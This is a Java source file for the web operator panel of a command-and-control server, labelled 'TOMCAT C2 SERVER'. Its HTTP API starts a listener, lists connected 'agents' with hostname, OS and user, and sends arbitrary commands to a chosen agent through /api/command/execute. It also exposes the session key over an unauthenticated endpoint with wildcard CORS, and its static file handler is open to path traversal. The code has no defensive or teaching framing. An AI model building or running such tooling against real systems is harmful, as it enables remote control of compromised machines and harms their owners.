package com.tomcat.iface;

import com.google.gson.Gson;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;

import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public class WebApp {
    private final ServerConfig Config;
    private TomcatServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;
    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final int MaxLogs;
    private final Gson GsonInst = new Gson();

    public WebApp(ServerConfig Config) {
        this.Config = Config;
        this.MaxLogs = Config.GetMaxLogEntries();
    }

    public void Run(String WebHost, int WebPort) throws Exception {
        InetSocketAddress Addr = new InetSocketAddress(WebHost, WebPort);
        HttpSrv = HttpServer.create(Addr, 100);
        SetupRoutes();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();
        Logger.Messages("Web Panel Started On http://" + WebHost + ":" + WebPort);
        Logger.Messages("Press Ctrl+C To Stop");
        AddLog("=".repeat(70));
        AddLog("TOMCAT C2 SERVER - SYSTEM INITIALIZED");
        AddLog("=".repeat(70));
    }

    private void SetupRoutes() {
        HttpSrv.createContext("/", new StaticHandler());
        HttpSrv.createContext("/api/server/status", Exc -> HandleRequest(Exc, this::ApiServerStatus));
        HttpSrv.createContext("/api/server/start", Exc -> HandleRequest(Exc, this::ApiServerStart));
        HttpSrv.createContext("/api/server/stop", Exc -> HandleRequest(Exc, this::ApiServerStop));
        HttpSrv.createContext("/api/agents", Exc -> HandleRequest(Exc, this::ApiGetAgents));
        HttpSrv.createContext("/api/logs", Exc -> HandleRequest(Exc, this::ApiGetLogs));
        HttpSrv.createContext("/api/logs/clear", Exc -> HandleRequest(Exc, this::ApiClearLogs));
        HttpSrv.createContext("/api/command/execute", Exc -> HandleRequest(Exc, this::ApiExecuteCommand));
    }

    @FunctionalInterface
    interface RequestHandler { String Handle(HttpExchange E) throws Exception; }

    private void HandleRequest(HttpExchange E, RequestHandler Handler) {
        try {
            E.getResponseHeaders().add("Content-Type", "application/json");
            E.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
            E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type");
            if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                E.sendResponseHeaders(200, -1);
                return;
            }
            String Response = Handler.Handle(E);
            byte[] Bytes = Response.getBytes("UTF-8");
            E.sendResponseHeaders(200, Bytes.length);
            try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
        } catch (Exception Ex) {
            try {
                String Err = GsonInst.toJson(Map.of("Error", Ex.getMessage()));
                byte[] Bytes = Err.getBytes("UTF-8");
                E.sendResponseHeaders(500, Bytes.length);
                try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
            } catch (IOException Ignored) {}
        }
    }

    private String ApiServerStatus(HttpExchange E) {
        if (Server != null && Server.IsRunning()) {
            Map<String, Object> Resp = new LinkedHashMap<>();
            Resp.put("Status", "Online");
            Resp.put("Host", Server.GetHost());
            Resp.put("Port", Server.GetPort());
            Resp.put("Uptime", GetUptime());
            Resp.put("Agents", Server.GetSessions().Count());
            Resp.put("Key", new String(Server.GetCrypto().GetKey()));
            return GsonInst.toJson(Resp);
        }
        return GsonInst.toJson(Map.of("Status", "Offline", "Agents", 0));
    }

    private String ApiServerStart(HttpExchange E) throws Exception {
        if (Server != null && Server.IsRunning())
            return GsonInst.toJson(Map.of("Success", false, "Message", "Server Already Running"));
        Map<String, Object> Body = ParseBody(E);
        String Host = Body.getOrDefault("Host", Config.GetServerHost()).toString();
        int Port = (int) Double.parseDouble(Body.getOrDefault("Port", Config.GetServerPort()).toString());
        boolean Mtls = Config.IsMtlsEnabled();
        Server = new TomcatServer(Host, Port, Mtls, Config);
        Server.AddEventListener(this::EventHandler);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            AddLog("[!] Failed to start server");
            return GsonInst.toJson(Map.of("Success", false, "Message", "Failed to start server"));
        }
        ServerStartTime = Instant.now();
        AddLog("[+] Server started on " + Host + ":" + Port);
        AddLog("[+] Session Key: " + new String(Server.GetCrypto().GetKey()));
        Thread AccThread = new Thread(Server::AcceptConnections, "AcceptConnections");
        AccThread.setDaemon(true);
        AccThread.start();
        Map<String, Object> Resp = new LinkedHashMap<>();
        Resp.put("Success", true);
        Resp.put("Message", "Server started on " + Host + ":" + Port);
        Resp.put("Host", Host);
        Resp.put("Port", Port);
        Resp.put("Key", new String(Server.GetCrypto().GetKey()));
        return GsonInst.toJson(Resp);
    }

    private String ApiServerStop(HttpExchange E) {
        if (Server == null || !Server.IsRunning())
            return GsonInst.toJson(Map.of("Success", false, "Message", "Server not running"));
        Server.StopServer();
        ServerStartTime = null;
        AddLog("[!] Server Stopped");
        return GsonInst.toJson(Map.of("Success", true, "Message", "Server Stopped"));
    }

    private String ApiGetAgents(HttpExchange E) {
        if (Server == null || !Server.IsRunning())
            return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("Address", S.GetRemoteAddress());
            A.put("OS", S.GetOs());
            A.put("Hostname", S.GetHostname());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("AgentName", S.GetAgentName());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            Agents.add(A);
        }
        return GsonInst.toJson(Map.of("Agents", Agents));
    }

    private String ApiGetLogs(HttpExchange E) {
        return GsonInst.toJson(Map.of("Logs", new ArrayList<>(Logs)));
    }

    private String ApiClearLogs(HttpExchange E) {
        Logs.clear();
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiExecuteCommand(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning())
            return GsonInst.toJson(Map.of("Success", false, "Output", "Server not running"));
        Map<String, Object> Body = ParseBody(E);
        int AgentId = (int) Double.parseDouble(Body.getOrDefault("AgentId", 0).toString());
        String Command = Body.getOrDefault("Command", "").toString();
        if (AgentId == 0 || Command.isEmpty())
            return GsonInst.toJson(Map.of("Success", false, "Output", "Missing AgentId or Command"));
        AddLog("[>] Agent " + AgentId + " | Executing: " + Command);
        String[] Result = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        if (Ok) AddLog("[+] Output:\n" + Result[1]);
        else AddLog("[!] Error: " + Result[1]);
        return GsonInst.toJson(Map.of("Success", Ok, "Output", Result[1], "Command", Command));
    }

    private void EventHandler(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> AddLog(String.format(
                "[+] New Session [%s] ID:%s Hostname:%s OS:%s User:%s",
                Data.get("Type"), Data.get("ID"), Data.get("Hostname"),
                Data.get("OS"), Data.get("User")));
            case AgentDisconnected -> AddLog(
                "[!] Session Disconnected ID:" + Data.get("ID") + " Reason:" + Data.get("Reason"));
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }

    private Map<String, Object> ParseBody(HttpExchange E) throws Exception {
        try (InputStream Is = E.getRequestBody()) {
            String Body = new String(Is.readAllBytes(), "UTF-8");
            if (Body.isEmpty()) return new HashMap<>();
            return GsonInst.fromJson(Body, Map.class);
        }
    }

    private void AddLog(String Msg) {
        String Ts = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        Logs.add("[" + Ts + "] " + Msg);
        if (Logs.size() > MaxLogs) Logs.remove(0);
    }

    private String GetUptime() {
        if (ServerStartTime == null) return "00:00:00";
        long Secs = Duration.between(ServerStartTime, Instant.now()).getSeconds();
        return String.format("%02d:%02d:%02d", Secs / 3600, (Secs % 3600) / 60, Secs % 60);
    }

    class StaticHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange E) throws IOException {
            String Path = E.getRequestURI().getPath();
            if (Path.equals("/")) Path = "/index.html";
            Path FullPath = Paths.get(Config.GetTemplateDir() + Path);
            if (!Files.exists(FullPath)) {
                FullPath = Paths.get(Config.GetStaticDir() + Path);
            }
            if (!Files.exists(FullPath)) {
                byte[] Resp = "404 Not Found".getBytes();
                E.sendResponseHeaders(404, Resp.length);
                E.getResponseBody().write(Resp);
                return;
            }
            String ContentType = GetContentType(Path);
            E.getResponseHeaders().add("Content-Type", ContentType);
            byte[] Data = Files.readAllBytes(FullPath);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream Os = E.getResponseBody()) { Os.write(Data); }
        }

        private String GetContentType(String Path) {
            if (Path.endsWith(".html")) return "text/html; charset=UTF-8";
            if (Path.endsWith(".css")) return "text/css";
            if (Path.endsWith(".js")) return "application/javascript";
            if (Path.endsWith(".json")) return "application/json";
            if (Path.endsWith(".png")) return "image/png";
            if (Path.endsWith(".ico")) return "image/x-icon";
            return "application/octet-stream";
        }
    }
}
